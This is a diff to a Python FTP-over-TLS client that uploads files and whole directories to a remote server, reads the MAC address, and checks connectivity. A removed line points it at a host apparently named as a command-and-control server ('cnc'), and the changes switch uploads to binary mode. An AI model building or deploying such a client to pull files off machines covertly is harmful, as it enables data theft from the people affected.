@@ -4,6 +4,7 @@ import urllib
 import time
 import shutil
 import socket
+import ftplib
 from ftplib import FTP_TLS
 from uuid import getnode as get_mac
 
@@ -28,8 +29,8 @@ def download_ksb(filename):
     return 1
 
 def upload(filename):
-    myfile = open(filename, 'r')
-    ftps.storlines('STOR %s' % filename, myfile)
+    myfile = open(filename, 'rb')
+    ftps.storbinary('STOR %s' % filename, myfile)
     myfile.close()
     return 1
 
@@ -38,8 +39,8 @@ def upload_directory(dirname):
     for file in os.listdir(dirname):
         path = os.path.join(dirname, file)
         if not os.path.isdir(path):
-            sendfile = open(path, 'r')
-            ftps.storlines('STOR %s' % file, sendfile)
+            sendfile = open(path, 'rb')
+            ftps.storbinary('STOR %s' % file, sendfile)
             sendfile.close()
             time.sleep(1)
         else:
@@ -230,17 +231,14 @@ def correct_config_file():
     wf.close()
     return 1
 
-def check_conn():
+def check_conn(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    result = sock.connect_ex(('cnc.gov.us',21))
+    result = sock.connect_ex((ip,21))
     if result == 0:
         return 1
     else:
         return 0
 
-conn = 0
-while conn == 0:
-    conn = check_conn()
 ftps = FTP_TLS(ip)
 ftps.login(user_name, password)
 ftps.prot_p()
